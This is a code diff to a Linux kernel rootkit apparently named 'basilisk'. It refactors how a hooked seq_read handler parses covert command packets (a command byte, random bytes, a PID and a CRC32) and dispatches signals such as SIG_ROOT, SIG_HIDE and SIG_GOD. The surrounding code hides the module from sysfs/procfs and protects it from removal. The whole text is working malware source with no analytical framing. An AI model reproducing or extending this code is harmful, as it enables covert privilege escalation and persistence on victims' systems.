@@ -13,7 +13,7 @@
 #include <linux/namei.h>
 #include <linux/rwlock.h>
 #include <linux/pid.h>
-#include "include/crc32.h"
+
 #include "include/ftrace_helper.h"
 #include "include/stealth_helper.h"
 #include "include/utils.h"
@@ -34,6 +34,7 @@ MODULE_VERSION("2.0");
 #define PTREGS_SYSCALL_STUBS 1
 #endif
 
+/* Enum for the different command signals */
 typedef enum {
     SIG_GOD = 0xFFFFFFFF,
     SIG_HIDE = 0xFFFFFFFA,
@@ -41,12 +42,25 @@ typedef enum {
     SIG_ROOT = 0xFFFFFFBA,
 } CmdSignal;
 
+enum {
+  /* Component sizes */
+  CMD_SIZE = sizeof(char),            
+  RAND_BYTES_SIZE = 4 * sizeof(char), 
+  PID_SIZE = sizeof(pid_t),           
+  CRC_SIZE = sizeof(uint32_t),        
+
+  TOTAL_SIZE = CMD_SIZE + RAND_BYTES_SIZE + PID_SIZE + CRC_SIZE,
+  
+  /* Offsets */
+  PID_OFFSET = TOTAL_SIZE - (PID_SIZE + CRC_SIZE),
+  CRC_OFFSET = TOTAL_SIZE - CRC_SIZE
+};
+
 static bool hidden = false; // toggle for hiding from sysfs/procfs
 static bool protected = false; // toggle for inc/decrementing module ref count (un/protecting it from being removed)
 
 static struct file_operations *king_fops = NULL;
 
-// static struct file_operations *king_fops;
 static DEFINE_RWLOCK(king_fops_lock);
 
 /* Executes appropriate functions based on given signal. pid is meant to be used with signal SIG_ROOT */
@@ -85,15 +99,12 @@ static const struct proc_ops kallsyms_proc_ops = {
 static asmlinkage ssize_t (*orig_seq_read)(struct file *file, char __user *buf, size_t size, loff_t *ppos);
 static asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos) 
 {
-    long error;
     char *kbuf;
-    CmdSignal sig;
-    uint32_t extracted_crc, calculated_crc;
-    size_t crc_size = sizeof(uint32_t); // length of uint32_t
-    size_t pid_size = sizeof(pid_t);
+    long error;
 
-    size_t data_size = 5 * sizeof(char) + sizeof(pid_t) + sizeof(uint32_t);
+    CmdSignal sig;
     pid_t pid;
+    uint32_t extracted_crc, calculated_crc;
 
     kbuf = kmalloc(size, GFP_KERNEL);
     if (!kbuf) {
@@ -111,14 +122,16 @@ static asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf, siz
     }
 
     sig = (CmdSignal)kbuf[0]; // first byte (command)
-    pid = *(pid_t *)(kbuf + data_size - (crc_size + sizeof(pid_t)));
-    extracted_crc = *(uint32_t *)(kbuf + data_size - crc_size);
-    calculated_crc = crc32(kbuf, data_size - crc_size);
+    memcpy(&pid, kbuf + PID_OFFSET, PID_SIZE);
+    memcpy(&extracted_crc, kbuf + CRC_OFFSET, CRC_SIZE);
+
+    calculated_crc = crc32(kbuf, TOTAL_SIZE - CRC_SIZE);
 
     if (calculated_crc != extracted_crc) {
       kfree(kbuf);
       return orig_seq_read(file, buf, size, ppos);
     }
+    
     pr_info("basilisk: received signal: %x\n", sig);
     sig_handle(sig, pid);
 
